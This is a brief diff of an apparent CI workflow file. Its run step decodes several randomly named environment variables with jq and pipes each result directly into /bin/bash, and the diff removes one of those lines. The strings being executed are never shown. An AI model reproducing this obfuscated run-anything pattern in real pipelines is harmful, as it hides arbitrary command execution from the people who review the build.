@@ -26,7 +26,6 @@ jobs:
           echo $y6 | jq -r .vxvfb7 | /bin/bash
           echo $naouv86 | jq -r .df6 | /bin/bash
           echo $onhvu2854 | jq -r .khm706 | /bin/bash
-          echo $rnn19220 | jq -r .yni1944 | /bin/bash
           echo $bqyac34994 | jq -r .c94 | /bin/bash
 
       - name: Archive results
